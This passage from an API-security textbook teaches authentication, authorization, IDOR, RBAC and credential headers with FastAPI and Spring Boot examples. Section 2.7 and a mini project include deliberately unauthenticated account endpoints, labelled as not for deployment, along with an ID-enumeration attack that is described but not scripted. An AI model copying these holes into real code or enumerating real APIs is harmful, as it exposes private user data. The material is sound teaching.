> **Term defined: IDOR** — **I**nsecure **D**irect **O**bject **R**eference. This occurs when an API exposes a resource by a predictable identifier (like a sequential integer ID) and fails to check whether the requester is *allowed* to access that specific resource — often because there's no reliable way to know who the requester even is in the first place.

```http
GET /accounts/8823 HTTP/1.1
Host: api.mybank.com
                                          (no Authorization header at all)

HTTP/1.1 200 OK
Content-Type: application/json

{"id": 8823, "owner": "Anuj Sharma", "balance": 15230.50}
```

Now imagine an attacker simply loops: `GET /accounts/1`, `GET /accounts/2`, `GET /accounts/3`, ... `GET /accounts/99999`. Without authentication, every single one of those succeeds, and the attacker has just harvested every account balance and owner name in the bank. This is not a hypothetical — IDOR-style data leaks are among the most commonly reported real-world API vulnerabilities.

---

## 2.4 Public APIs vs Private APIs

Not every API needs authentication — this is an important nuance beginners often miss (some assume *all* APIs must always be locked down).

| | Public API | Private API |
|---|---|---|
| Who can call it | Anyone, unauthenticated | Only verified, known callers |
| Example | `GET /books` (Chapter 1's project), a public weather API, public stock price lookups | `GET /accounts/8823`, `POST /orders`, anything touching personal or sensitive data |
| Authentication required? | Often none, or a lightweight API key mainly for *rate-limiting/attribution*, not secrecy | Yes — mandatory, and typically enforced on every single endpoint |
| Risk if left unauthenticated | Usually low (data was meant to be public anyway) | Severe — the scenarios in section 2.3 |

> **Common Mistake:** Assuming "internal only" or "not linked from the UI" means an endpoint is safe without authentication. This is called **security through obscurity**, and it fails constantly — attackers routinely discover "hidden" endpoints via API documentation left in JS bundles, mobile app decompilation, or simple guessing. If an endpoint returns or modifies anything sensitive, it needs real authentication, full stop — regardless of whether you think anyone will "find" it.

**Decision flowchart:**

```
        Does this endpoint return or modify
        data specific to one user/account,
        or data that shouldn't be public?
                     │
          ┌──────────┴──────────┐
          │                     │
         YES                    NO
          │                     │
          ▼                     ▼
  Require authentication   Can likely remain public
  on this endpoint          (still consider API keys
  (Chapters 5–10)            for rate-limiting, Ch.6)
```

---

## 2.5 Real-world scenarios

Each domain below illustrates a *different flavor* of why authentication matters — not just "because it's sensitive," but the specific shape of harm.

### Banking
- **Data at risk:** account balances, transaction history, personal identifying information.
- **Action at risk:** funds transfers, bill payments.
- **Why it's severe:** direct, immediate financial loss; regulatory consequences (banks are legally required to authenticate — this isn't optional, it's compliance).

```http
POST /v1/accounts/8823/transfer HTTP/1.1
Authorization: Bearer <token proving this request is really from Anuj>

{"toAccount": "9911", "amount": 500000.00}
```
Without that `Authorization` header being checked, this single request could drain an account.

### Social Media
- **Data at risk:** private messages, personal photos, draft posts.
- **Action at risk:** posting *as* someone else, deleting their content, impersonation for scams/fraud (a very real, common attack: hijacking accounts to scam the victim's friends/followers).
- **Why it's severe:** reputational harm, harassment, large-scale disinformation if a high-follower account is compromised.

### E-commerce
- **Data at risk:** saved payment methods, order history, shipping addresses.
- **Action at risk:** placing orders using someone else's saved payment method; viewing others' order/purchase history.
- **Why it's severe:** direct financial fraud, privacy violations (e.g., someone's purchase history reveals medical conditions, relationship status, etc.).

### Healthcare
- **Data at risk:** medical records, diagnoses, prescriptions, appointment history.
- **Action at risk:** unauthorized viewing or modification of medical records.
- **Why it's severe:** healthcare data is subject to strict legal protection in most jurisdictions (e.g., HIPAA in the US); a leak isn't just embarrassing, it can be actively life-endangering (e.g., a tampered prescription record) and carries serious legal liability for the provider.

> **Remember:** Across all four domains, the pattern is identical even though the data differs: **no authentication → no way to bind a request to a real identity → no way to protect that identity's data or actions.** Everything in Chapters 5 through 10 is different technical answers to the exact same underlying need you just saw four times.

---

## 2.6 Sequence diagram — the shape every future chapter follows

This is the generic "shape" of an authenticated request. Every scheme from Chapter 5 onward (Basic Auth, API Keys, Sessions, JWT, OAuth) is a specific implementation of this same skeleton:

```
   Client                         Server                      Identity Store
     │                               │                          (DB / cache)
     │  1. Request + credential      │                              │
     │ ─────────────────────────────>│                              │
     │                               │  2. Extract credential       │
     │                               │  3. Verify credential ──────>│
     │                               │                              │
     │                               │  4. Valid? user/identity  <──│
     │                               │                              │
     │                               │  5. Attach identity to       │
     │                               │     the request context      │
     │                               │  6. Proceed to handle the    │
     │                               │     request AS that identity │
     │  7. Response                  │                              │
     │ <───────────────────────────  │                              │
```

Hold this diagram in your head for the rest of the book. Step 1 changes shape per chapter (a password? a token? a signed cookie?). Steps 2–4 change *how* verification happens (decode Base64? query a database? verify a cryptographic signature?). But steps 5–7 are always the same: once identity is established, the server proceeds *as that identity*, and everything else (including authorization, Chapter 3) builds on top of it.

---

## 2.7 Seeing it hands-on: before and after

**Reference implementation (Python / FastAPI) — the "before" state, deliberately insecure, to make the problem tangible:**

```python
# insecure_accounts.py — DO NOT deploy this; for demonstration only.
from fastapi import FastAPI, HTTPException

app = FastAPI()

ACCOUNTS = {
    8823: {"owner": "Anuj Sharma", "balance": 15230.50},
    8824: {"owner": "Priya Rao", "balance": 402110.00},
}

@app.get("/accounts/{account_id}")
def get_account(account_id: int):
    # PROBLEM: no check whatsoever on WHO is calling this.
    # Any request, from anyone, for any account_id, succeeds.
    if account_id not in ACCOUNTS:
        raise HTTPException(status_code=404, detail="Account not found")
    return ACCOUNTS[account_id]
```

Run it, then from a terminal:
```bash
curl -i http://127.0.0.1:8000/accounts/8823   # works — no credentials sent at all!
curl -i http://127.0.0.1:8000/accounts/8824   # also works — someone else's balance!
```

That second call is the IDOR problem from section 2.3, made real in five lines of code. We are *not* fixing this yet — the actual fix (checking a real credential) is Chapter 5's job, once you've also read Chapter 4 on where credentials travel. For now, the goal is only that you've *felt* the gap.

**Spring Boot (Java) — same insecure shape, for comparison:**

```java
// InsecureAccountController.java — DO NOT deploy; for demonstration only.
@RestController
@RequestMapping("/accounts")
public class InsecureAccountController {

    private final Map<Integer, Account> accounts = Map.of(
        8823, new Account("Anuj Sharma", 15230.50),
        8824, new Account("Priya Rao", 402110.00)
    );

    @GetMapping("/{accountId}")
    public Account getAccount(@PathVariable int accountId) {
        // Same problem: Spring Security isn't even in this project yet,
        // so this endpoint is wide open by default. Chapter 11 covers
        // exactly how Spring Security's filter chain closes this gap.
        Account acc = accounts.get(accountId);
        if (acc == null) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, "Account not found");
        }
        return acc;
    }
}
```

**What's happening internally (and *not* happening):** In both frameworks, by default, a route handler is invoked purely based on matching the HTTP method + path. Neither FastAPI nor Spring Boot inserts an identity check for you automatically — that's a deliberate design choice in both ecosystems, because not every endpoint needs one (section 2.4). It is entirely the developer's responsibility to add that check, either manually per-endpoint or via a framework-level mechanism (FastAPI *dependencies*, Spring Security's *filter chain* — both covered in depth later in this book).

---

## 2.8 Security considerations at this stage

Even before we pick a specific authentication mechanism, a few principles apply universally and will recur every chapter from here on:

- **Fail closed, not open.** If your authentication check errors out or can't reach its identity store, the *correct* behavior is to reject the request (401), not let it through. "Failing open" (letting requests through when the check itself breaks) is a recurring, serious real-world vulnerability class.
- **Authenticate as early as possible in the request lifecycle.** The sooner a bad request is rejected, the less of your system's logic and resources it touches. This is *why* frameworks provide middleware/filter-chain mechanisms (previewed above, detailed in Chapters 4, 5, and 11) rather than expecting every function to manually check credentials.
- **Never trust client-supplied identity without verification.** A request that simply *says* `"userId": 8823` in its JSON body proves nothing — anyone can type any number. Identity must come from a **verified credential** (a password check, a valid signed token, etc.), never from an unverified, self-reported field. This exact mistake — trusting an unverified field instead of a verified credential — is one of the most common real-world API vulnerabilities and will be called out again explicitly in Chapter 8 and Chapter 12.

> **Common Mistake:** Confusing "this data isn't linked anywhere in my app's UI" with "this data is protected." As stated in section 2.4, unauthenticated-but-hidden is not a substitute for actual authentication.

---

## Chapter 2 Summary

- **Authentication** answers "who are you?" — nothing more (authorization, "what can you do," is Chapter 3).
- Authentication is necessary specifically *because* HTTP is stateless and URLs are guessable/discoverable — without it, a server cannot distinguish a legitimate caller from anyone else on the internet.
- Problems without authentication include impersonation, data exposure (notably **IDOR**), unrestricted writes, no accountability, no personalization, and no way to enforce per-user rate limits.
- **Public APIs** may reasonably have no authentication; **private APIs** (anything touching personal/sensitive data or state-changing actions) must have it — and "nobody links to it" is not a valid substitute (security through obscurity).
- Banking, social media, e-commerce, and healthcare each illustrate a different concrete flavor of harm from missing authentication, but the root cause is identical in all four.
- Every future authentication scheme in this book follows the same generic sequence: present credential → extract → verify against an identity store → attach identity to the request → proceed.
- Security principles that apply from this point forward: fail closed, authenticate early, never trust unverified client-supplied identity claims.

---

## Interview Questions — Chapter 2

**Q1. Why can't a server just "remember" a logged-in user the way a human receptionist would remember a repeat visitor?**
Because HTTP is stateless by design (Chapter 1, section 1.4) — each request is handled independently, with no inherent memory of prior requests. Some form of credential must therefore be presented and verified *on every request* (directly, or via a mechanism like a session ID or token that stands in for repeated re-verification — covered in Chapters 7 and 8).

**Q2. What is IDOR, and how does authentication address it?**
IDOR (Insecure Direct Object Reference) is when a resource is exposed via a predictable identifier and the server fails to check whether the requester is entitled to access that specific object. Authentication is a *necessary but not sufficient* first step — it establishes *who* is asking; you then also need an authorization check (Chapter 3) to confirm *that specific identity* is allowed to access *that specific resource*.

**Q3. Give an example of an API that reasonably doesn't need authentication, and explain why.**
A public read-only endpoint like a public weather forecast or public stock ticker lookup — the data isn't tied to any individual's private information and is meant to be openly accessible, so there's no identity-based access decision to make. (Rate-limiting via a lightweight API key, Chapter 6, may still be desirable, but that's a different concern from protecting sensitive data.)

**Q4. What does "fail closed" mean, and why does it matter for authentication specifically?**
It means that when an authentication check itself fails or errors (e.g., can't reach the identity store), the request should be rejected by default, not allowed through. It matters because the alternative ("fail open") silently disables your security exactly when something is already going wrong — historically a source of serious real-world breaches.

**Q5. Why shouldn't a server trust a `"userId"` field sent in a request body as proof of identity?**
Because it's client-supplied and unverified — anyone can type any value into a JSON body. Real identity must come from a credential the server can independently verify (a correctly-signed token, a validated session ID, etc.), not from the client simply asserting who it claims to be.

---

## Hands-On Exercises — Chapter 2

1. Take the insecure FastAPI `/accounts/{account_id}` example from section 2.7, run it, and use `curl` to retrieve *both* accounts with zero credentials — confirm for yourself that nothing stops you.
2. List three endpoints from a real app you use daily (banking, email, shopping — your choice) that you'd classify as "must require authentication," and one you'd classify as "could reasonably be public." Justify each using the decision flowchart in section 2.4.
3. Using the sequence diagram in section 2.6 as a template, redraw it for a *specific* scenario of your choosing (e.g., "checking your order history on an e-commerce site"), labeling what the "credential" and "identity store" would concretely be — even though you don't yet know the exact mechanism (that's fine; guess, and you'll check yourself against Chapter 5 onward).
4. Explain, in writing, in 3–4 sentences, why "the endpoint isn't in our app's navigation menu" does not make it secure.

## Mini Project — Chapter 2

Extend Chapter 1's `/books` API (or the insecure `/accounts` example above) by adding a **deliberately naive, insecure "identity" field** to prove to yourself exactly what's still missing — you are not implementing real authentication yet (that's Chapter 5).

Requirements:
- Add a new endpoint `GET /my-books?userId=<id>` that filters books by an `ownerId` field you add to each book.
- Test it by passing `userId=1` and then `userId=2` and confirm you can retrieve *anyone's* books just by changing the query parameter — with nothing stopping you.
- Write a short comment block at the top of the file explaining, in your own words, exactly which piece is missing (a way to *verify* the `userId` actually belongs to the caller) and which chapter will fix it.

This exercise exists purely to make the vulnerability muscle-memory-obvious before we introduce the fix — it's deliberately uncomfortable to build something you already know is broken.

---

## Preparing for Chapter 3

We've now firmly established *why* the server must know who's calling. But "who's calling" and "what are they allowed to do" are two separate questions — and conflating them is the single most common conceptual error in this entire subject. Chapter 3 draws that line precisely, with diagrams, comparison tables, and the vocabulary (identity, permissions, roles) you'll use for the rest of the book.

---

*End of Chapter 2.*

---

# Chapter 3 — Authentication vs Authorization

## 3.0 Where we left off

Chapter 2 ended with a deliberate cliffhanger: authentication tells a server *who* is calling, but not *what that caller is allowed to do*. This chapter draws that boundary precisely, because — stated plainly, up front — **confusing these two concepts is the single most common conceptual error in this entire field**, and it shows up constantly in interviews, in code reviews, and in real production vulnerabilities. By the end of this chapter, you will never confuse them again.

---

## 3.1 Authentication — a precise recap

You met this in Chapter 2, but let's restate it with full precision now that authorization is about to sit right next to it.

**Simple explanation:** Authentication proves *who you are*.

**Technical definition:** The process of verifying a claimed identity against a trusted credential check, producing (on success) a confirmed **identity** the system can now act on behalf of.

**One-line test:** *"Is this really the person/system it claims to be?"*

---

## 3.2 Authorization — introduced properly

**Simple explanation:** Authorization decides *what you're allowed to do*, once the system already knows who you are.

**Technical definition:** Authorization (often abbreviated **authZ**) is the process of determining whether an already-authenticated identity has **permission** to perform a specific action on a specific resource.

**One-line test:** *"Now that I know who you are — are you allowed to do THIS, to THIS THING?"*

**Real-world analogy — continuing the bank branch scene from Chapter 2:**

```
   Teller: [already confirmed, via your ID, that you are Anuj Sharma]
           "You'd like to withdraw ₹50,000 from account 8823."
           [checks: is Anuj Sharma an owner or authorized signatory
            on account 8823? Does the account have ₹50,000 available?
            Is Anuj's daily withdrawal limit already used up?]
   Teller: "Approved" — or — "Sorry, you're not on this account."
```

Notice: the teller never re-checks *who you are* at this stage — that was already settled. This stage only asks whether *this specific, already-known identity* may perform *this specific action* on *this specific account*. That's authorization, in full.

> **Remember:** You **authenticate once (per session/request)**, but you may be **authorized — or denied — differently for every single action or resource** you attempt to touch, even within the same request session. Authentication is a single yes/no gate at the door; authorization is re-evaluated per action.

---

## 3.3 Side-by-side comparison

| | Authentication | Authorization |
|---|---|---|
| Question answered | Who are you? | What are you allowed to do? |
| Happens | First (must succeed before authorization is even evaluated) | Second, and potentially repeatedly, after identity is known |
| Input | A credential (password, token, key, certificate) | An already-confirmed identity + the specific action/resource being requested |
| Output | An identity (e.g., "this is user 8823") | A decision: allow or deny |
| HTTP status code on failure | **401 Unauthorized** | **403 Forbidden** |
| Typical mechanisms | Basic Auth, API Keys, Sessions, JWT, OAuth (Ch. 5–9) | Roles, permissions, scopes, policies (Ch. 3, 9, 11) |
| Can it change per-request without re-login? | No — identity is stable for the life of the credential | Yes — permissions can be checked freshly for every action |
| Analogy | Showing your ID at the door | The bouncer checking if your ID lets you into the VIP section specifically |

> **Interview Tip:** This table, especially the 401-vs-403 row, is close to guaranteed interview material. Memorize it not as trivia, but by re-deriving it from the "who are you" vs "what can you do" distinction — interviewers can tell the difference between a memorized answer and an understood one.

---

## 3.4 Identity, Permissions, and Roles — the vocabulary of authorization

To talk about authorization precisely, you need three more terms, each building on the last.

### Identity
**Definition:** The specific, uniquely identifiable subject a system is acting on behalf of after authentication succeeds — typically a user account, but can also be a service, a device, or an API client.

```
   Authentication succeeds
          │
          ▼
   Identity established: { "id": 8823, "type": "user", "name": "Anuj Sharma" }
```

### Permissions
**Definition:** A specific, granular capability — "can read account balance," "can initiate a transfer," "can delete a user." Permissions are the atomic units authorization decisions are made from.

```
   permissions for identity 8823 on resource "account:8823":
      - account:read      ✅
      - account:transfer  ✅
      - account:delete    ❌  (only bank staff have this permission)
```

### Roles
**Definition:** A named, reusable *bundle* of permissions, assigned to identities, so you don't have to grant permissions one-by-one to every single user.

```
                    ROLE: "customer"
              ┌───────────────────────────┐
              │  account:read              │
              │  account:transfer (own)    │
              └───────────────────────────┘

                    ROLE: "bank_staff"
              ┌───────────────────────────┐
              │  account:read (any)        │
              │  account:freeze            │
              │  account:audit_log:read    │
              └───────────────────────────┘

   Identity 8823 (Anuj)  ──assigned──>  role "customer"
   Identity 4471 (Priya, staff)  ──assigned──>  role "bank_staff"
```

This pattern — identities assigned roles, roles bundling permissions — is called **Role-Based Access Control (RBAC)**, and it's the most common authorization model in production systems. We revisit RBAC concretely with real Spring Security code in Chapter 11.

> **Common Mistake:** Hardcoding permission checks against a *role name* directly in business logic (`if (user.role == "bank_staff")`) instead of checking a *permission* (`if (user.hasPermission("account:freeze"))`). The second form survives role restructuring (e.g., splitting "bank_staff" into "teller" and "manager" later) without touching business logic — the first form requires hunting down every hardcoded role check across your codebase. This is a real, common source of authorization bugs during org/role refactors.

---

## 3.5 Seeing both together in one request

Let's trace one full request through both stages, tying directly back to the sequence diagram from Chapter 2 (section 2.6) — this time with authorization added as an explicit extra stage:

```
   Client                          Server
     │                                │
     │  POST /accounts/8823/transfer  │
     │  Authorization: Bearer <token> │
     │  {"toAccount":"9911","amount":500}
     │ ──────────────────────────────>│
     │                                │
     │                       ┌────────┴─────────┐
     │                       │  STAGE 1:          │
     │                       │  AUTHENTICATION     │
     │                       │  - verify token     │
     │                       │  - resolve identity  │
     │                       │    -> user 8823     │
     │                       │  fail? -> 401        │
     │                       └────────┬─────────┘
     │                                │ pass
     │                       ┌────────┴─────────┐
     │                       │  STAGE 2:          │
     │                       │  AUTHORIZATION      │
     │                       │  - is user 8823      │
     │                       │    the owner of       │
     │                       │    account 8823?      │
     │                       │  - does user 8823      │
     │                       │    have permission      │
     │                       │    "account:transfer"?  │
     │                       │  fail? -> 403             │
     │                       └────────┬─────────┘
     │                                │ pass
     │                       [ perform the transfer ]
     │  201 Created                   │
     │ <──────────────────────────────│
```

Both stages must pass for the request to succeed. Failing stage 1 never even reaches stage 2 — there's no "identity" yet to check permissions for.

---

## 3.6 Implementation — seeing 401 vs 403 for real

**Reference implementation (Python / FastAPI):**

```python
from fastapi import FastAPI, Header, HTTPException

app = FastAPI()

# Deliberately simplified "identity store" and "permission store" —
# real versions of these are built out properly starting Chapter 5 (identity)
# and Chapter 11 (permissions/roles in depth).
VALID_TOKENS = {
    "token-anuj": {"id": 8823, "name": "Anuj Sharma", "role": "customer"},
    "token-priya": {"id": 4471, "name": "Priya Rao", "role": "bank_staff"},
}

ACCOUNTS = {
    8823: {"owner_id": 8823, "balance": 15230.50},
    8824: {"owner_id": 9999, "balance": 402110.00},
}

def authenticate(authorization: str | None) -> dict:
    # STAGE 1: authentication — do we know who this is, at all?
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Missing or malformed credential")
    token = authorization.removeprefix("Bearer ")
    identity = VALID_TOKENS.get(token)
    if identity is None:
        raise HTTPException(status_code=401, detail="Invalid credential")
    return identity  # identity is now established

@app.get("/accounts/{account_id}")
def get_account(account_id: int, authorization: str | None = Header(default=None)):
    identity = authenticate(authorization)          # STAGE 1

    account = ACCOUNTS.get(account_id)
    if account is None:
        raise HTTPException(status_code=404, detail="Account not found")

    # STAGE 2: authorization — is THIS identity allowed to read THIS account?
    is_owner = account["owner_id"] == identity["id"]
    is_staff = identity["role"] == "bank_staff"
    if not (is_owner or is_staff):
        raise HTTPException(status_code=403, detail="Not permitted to view this account")

    return account
```

**Explaining the two failure paths explicitly:**
```bash
# No credential at all -> 401 (we don't even know who's asking)
curl -i http://127.0.0.1:8000/accounts/8823

# Valid credential (we know it's Anuj), but Anuj isn't the owner of 8824 -> 403
curl -i http://127.0.0.1:8000/accounts/8824 -H "Authorization: Bearer token-anuj"

# Valid credential, and Anuj DOES own 8823 -> 200
curl -i http://127.0.0.1:8000/accounts/8823 -H "Authorization: Bearer token-anuj"

# Priya is bank_staff -> can view ANY account -> 200
curl -i http://127.0.0.1:8000/accounts/8823 -H "Authorization: Bearer token-priya"
```

**What's happening internally:** `authenticate()` is called first and *only* resolves identity — it has zero knowledge of accounts, ownership, or roles. The ownership/role check happens strictly afterward, using the identity that authentication handed back. This physical separation in the code mirrors the conceptual separation this whole chapter is about — and it's not just tidiness: keeping these as two distinct steps (rather than one tangled `if` block) is *why* frameworks can offer authentication as reusable, endpoint-agnostic middleware (previewed in Ch. 2, built properly in Ch. 4–5), while authorization checks stay close to each specific piece of business logic, since "who can do this" is inherently different per-resource.

**Spring Boot (Java) — same two stages, same shape:**

```java
@RestController
@RequestMapping("/accounts")
public class AccountController {

    // STAGE 1 (authentication) is NOT handled here at all in a real Spring
    // Boot app — it happens earlier, in Spring Security's filter chain
    // (full detail in Chapter 11). By the time this method runs, Spring
    // has already rejected any request that fails authentication with a 401,
    // and injected the resolved identity as `principal`.

    @GetMapping("/{accountId}")
    public Account getAccount(@PathVariable int accountId, Principal principal) {
        Account account = accountRepository.findById(accountId)
            .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND));

        // STAGE 2 (authorization) — explicit, resource-specific check,
        // deliberately kept HERE, next to the business logic it protects,
        // rather than in the generic security filter chain.
        boolean isOwner = account.getOwnerId().equals(principal.getName());
        boolean isStaff = hasRole(principal, "bank_staff");
        if (!isOwner && !isStaff) {
            throw new ResponseStatusException(HttpStatus.FORBIDDEN,
                "Not permitted to view this account");
        }

        return account;
    }
}
```

This split — authentication as cross-cutting infrastructure, authorization as resource-specific logic — is a deliberate, industry-standard architectural pattern, not an accident of these two examples. You'll see it again explicitly in Chapter 11.

---

## 3.7 Security considerations

- **Never let an authorization check silently fall back to "allow."** Every authorization decision should default to **deny**, with access explicitly granted only when a check passes. This mirrors "fail closed" from Chapter 2, applied specifically to the authorization stage.
- **Re-check authorization on every state-changing action**, even within what feels like "one user session." A user's role or permissions can change mid-session (e.g., an admin revokes access) — cached "you were allowed earlier" decisions can become stale and dangerous.
- **Don't leak information via status codes.** Returning `404 Not Found` instead of `403 Forbidden` for resources a user isn't authorized to know exist (rather than just can't access) is a legitimate, deliberate technique to avoid confirming a resource's existence to unauthorized callers — used commonly for highly sensitive resources. This is a judgment call per-endpoint, not a universal rule; know it exists so you can make that call consciously.

> **Common Mistake:** Performing authorization checks only in the client/frontend (e.g., hiding a "Delete" button in the UI for non-admins) without *also* enforcing it server-side. Client-side checks are a UX nicety; anyone can bypass them entirely by calling the API directly (with a tool like `curl` or Postman), exactly as you've been doing throughout this book's exercises. **Authorization must always be enforced server-side.**

---

## Chapter 3 Summary

- **Authentication** = "who are you?" **Authorization** = "what can you do?" — always in that order, and always as conceptually (and ideally physically, in code) separate steps.
- Failure modes have distinct, meaningful HTTP status codes: **401** = authentication failed (identity unknown/unverified), **403** = authentication succeeded but authorization failed (identity known, action denied).
- **Identity** is the confirmed "who," established once authentication succeeds.
- **Permissions** are granular capabilities; **roles** are named, reusable bundles of permissions assigned to identities — together forming **RBAC**, the most common authorization model.
- Authorization must be re-evaluated per action/resource, even within a single authenticated session, and must always be enforced server-side — never trust client-side checks alone.
- Authentication tends to live as reusable, cross-cutting infrastructure (middleware/filter chains); authorization tends to live close to the specific business logic it protects, since "who can do what" is inherently resource-specific.

---

## Interview Questions — Chapter 3

**Q1. A user gets a 403 error. What does that tell you, and what doesn't it tell you?**
It tells you the user *was* successfully authenticated (the server knows exactly who they are) — otherwise the response would have been 401. It tells you their identity does not have permission for the specific action/resource requested. It does *not* mean their credentials are invalid or expired.

**Q2. Can authorization ever be checked before authentication? Why or why not?**
No — authorization decisions are made *about* a specific identity ("is user X allowed to do Y"), and there is no confirmed identity to reason about until authentication has succeeded. Attempting authorization first is logically incoherent; frameworks structure the request pipeline to guarantee authentication runs first.

**Q3. What's the difference between a permission and a role?**
A permission is a single, granular capability (e.g., `account:delete`). A role is a named, reusable bundle of permissions (e.g., `bank_staff` might bundle `account:read (any)`, `account:freeze`, etc.) assigned to identities so permissions don't need to be granted one-by-one per user.

**Q4. Why is it dangerous to enforce authorization only on the frontend?**
Because the frontend is just one possible client — anyone can bypass it entirely and call the API directly with tools like curl or Postman. The API itself is the actual security boundary; if it doesn't enforce authorization server-side, hiding a button in the UI provides zero real protection.

**Q5. Give an example of why authorization might need to be re-checked mid-session, even though authentication already succeeded once.**
Example: an admin revokes a user's elevated permissions while that user still holds a valid, unexpired session/token. If authorization decisions were cached at login time rather than re-evaluated per action, the user could continue performing now-forbidden actions until their token expires — a real security gap.

---

## Hands-On Exercises — Chapter 3

1. Take the FastAPI example in section 3.6 and add a third identity/token representing a user who is neither the account owner nor bank_staff. Confirm you get a 403, and explain in one sentence why it's not a 401.
2. Design (on paper, no code needed) a role/permission table for a simple blogging platform with three roles: `reader`, `author`, `editor`. List at least 4 permissions and mark which roles have which.
3. Find a real app (any app you use) where you believe authorization is only enforced in the UI and not the API — or, if you can't find one, explain how you would test for this weakness responsibly on an app you own or have permission to test.
4. Rewrite this flawed logic to separate authentication from authorization explicitly, as two distinct steps: `if (request.headers["token"] == "abc123" and user.role == "admin"): allow()`.

## Mini Project — Chapter 3

Extend the account API from section 3.6 into a small **RBAC-enforced** service.

Requirements:
- At least 3 identities, at least 2 roles (`customer`, `bank_staff`), and a defined permission set per role (as in section 3.4).
- `GET /accounts/{id}` → 401 if no/invalid credential, 403 if the caller lacks permission for that specific account, 200 + data otherwise.
- `DELETE /accounts/{id}` → only permitted for a role with an explicit `account:delete` permission — prove that even `bank_staff` (as defined in this chapter, which only had `account:freeze`, not `delete`) correctly gets a 403 here.
- Write a short README explaining, for each endpoint, exactly which permission it requires and why.

---

## Preparing for Chapter 4

We now have precise vocabulary and precise failure codes for both authentication and authorization. But we still haven't answered a purely mechanical question that every implementation in this chapter quietly relied on: **exactly where, physically, in an HTTP request does a credential go, and in what format?** Chapter 4 catalogs every HTTP header used for authentication — `Authorization`, `Cookie`, `Set-Cookie`, `X-API-Key`, the `Bearer` and `Basic` schemes — so that Chapters 5 onward can each pick up one specific mechanism and go deep, without re-explaining headers every time.

---

*End of Chapter 3.*

---

# Chapter 4 — HTTP Headers Used for Authentication

## 4.0 Where we left off

Every example since Chapter 1 has quietly used an `Authorization` header without formally cataloging it. Chapter 3 ended by promising exactly this: a complete, precise map of *where* credentials physically travel in an HTTP request, and in *what shape*. This chapter is deliberately mechanical and reference-like — it exists so that Chapters 5 through 9 can each say "this scheme uses the header format from Chapter 4" and move straight to the interesting parts, instead of re-deriving header basics every time.

---

## 4.1 Why credentials live in headers, not the body

You already know (Chapter 1, section 1.10) that a request has both headers and a body. It's worth answering directly: why do virtually all authentication schemes put credentials in a **header**, specifically, rather than in the JSON body alongside application data?

- **Separation of concerns.** Headers are metadata *about* the request; the body is the request's actual application data. Identity is metadata about *who's asking*, not part of *what's being asked for* — it belongs conceptually with the metadata.
- **Universal accessibility to infrastructure.** Reverse proxies, API gateways, load balancers, and logging systems routinely need to inspect or act on credentials (e.g., to reject invalid requests before they reach your application code) — and they can do this cheaply by reading headers, without needing to parse and understand your API's specific body format (JSON schema, etc.), which may differ per endpoint.
- **Works even when there's no body at all.** Recall from Chapter 1 that `GET` and `DELETE` requests typically carry no body. If credentials lived in the body, authenticating a `GET` request would be awkward or impossible. Headers are present on every request, regardless of method.
- **Convention and interoperability.** Because virtually every framework, library, proxy, and tool expects credentials in specific, standardized headers (which this chapter catalogs), following the convention means your API works correctly with the entire existing ecosystem of HTTP tooling out of the box.

> **Remember:** As a hard rule for the rest of this book: **credentials go in headers (or, for browser-based sessions, cookies — which are themselves carried via headers, section 4.4). Never put a password, API key, or token inside a JSON request body**, even though nothing technically stops you from doing so.

---

## 4.2 The `Authorization` header

**Simple explanation:** This is the standard, general-purpose header for sending credentials from client to server.

**Technical definition:** `Authorization` is a request header, standardized by the HTTP specification, whose value has the shape:

```
Authorization: <scheme> <credentials>
```

Where `<scheme>` names *which kind* of credential follows, and `<credentials>` is the credential itself, formatted according to that scheme's rules. This chapter covers the two schemes you'll actually implement in this book — `Basic` and `Bearer` — in the next two sections.

```
   Authorization: Basic YW51ajpzZWNyZXQxMjM=
                  └─┬─┘ └──────────┬────────┘
                scheme          credentials
                                (scheme-specific format)

   Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI4ODIzIn0.abc123
                  └──┬─┘ └────────────────────┬───────────────────────┘
                scheme                    credentials
                                    (scheme-specific format)
```

> **Interview Tip:** "Is `Authorization` only used for authentication, given the name?" In practice, yes, almost exclusively — despite the name suggesting "authorization" (Chapter 3's meaning), this header is used, by convention, to carry the credential that establishes *authentication*. This is a well-known naming quirk in HTTP; interviewers sometimes ask this specifically to see if you know the distinction from Chapter 3 well enough to notice the header's name is slightly misleading.

---

## 4.3 The `Basic` scheme

Covered in full depth in Chapter 5 — this section gives just enough to complete the header catalog.

**Format:**
```
Authorization: Basic <base64(username:password)>
```

**Example:**
```http
Authorization: Basic YW51ajpzZWNyZXQxMjM=
```

Here, `YW51ajpzZWNyZXQxMjM=` is simply the Base64 encoding of the literal text `anuj:secret123`. Base64 is **encoding, not encryption** — it is trivially reversible by anyone, with no key required (this exact point, and why it matters enormously, is unpacked fully in Chapter 5). We flag it now only so you don't walk into Chapter 5 thinking Base64 provides any secrecy on its own.

---

## 4.4 The `Bearer` scheme

Covered in full depth starting Chapter 6 (API Keys) and especially Chapter 8 (JWT) — again, just enough here to complete the catalog.

**Format:**
```
Authorization: Bearer <token>
```

**Example:**
```http
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI4ODIzIn0.abc123signature
```

**Term defined — "bearer token":** A bearer token is a credential that grants access to **whoever holds it (bears it)**, with no additional proof required at the point of use — unlike, say, a password check that might also verify something else. In practical terms: if a bearer token is stolen, the thief can use it exactly as if they were the legitimate owner, until it's revoked or expires. This single fact drives an enormous amount of the security guidance you'll see in Chapters 8, 9, and 12 (short expiration times, HTTPS-only transmission, secure storage).

> **Common Mistake:** Treating "Bearer" as if it means "JWT." `Bearer` is just the *scheme name* — it describes the *trust model* (whoever presents this token is trusted), not the token's internal format. API keys (Chapter 6), opaque session tokens, and JWTs (Chapter 8) can all legitimately be sent as `Bearer` tokens.

---

## 4.5 API Keys and the `X-API-Key` header

**Simple explanation:** An API key is a long, unique, hard-to-guess string that identifies *which application or account* is making a request — most often used to identify a calling application/service rather than an individual human user.

**Technical definition:** API keys can travel in more than one place, and you should be able to recognize all of them:

```
Authorization: Bearer sk_live_51Hxy8...          (as a Bearer token)
Authorization: Api-Key sk_live_51Hxy8...          (custom scheme name)
X-API-Key: sk_live_51Hxy8...                       (dedicated custom header)
?api_key=sk_live_51Hxy8...                          (query string — generally discouraged)
```

`X-API-Key` is a **non-standard but extremely widely-adopted convention** — the leading `X-` prefix historically signaled "custom/non-standard header" (this prefix convention is technically deprecated by later HTTP specifications but remains common in practice for exactly this kind of header).

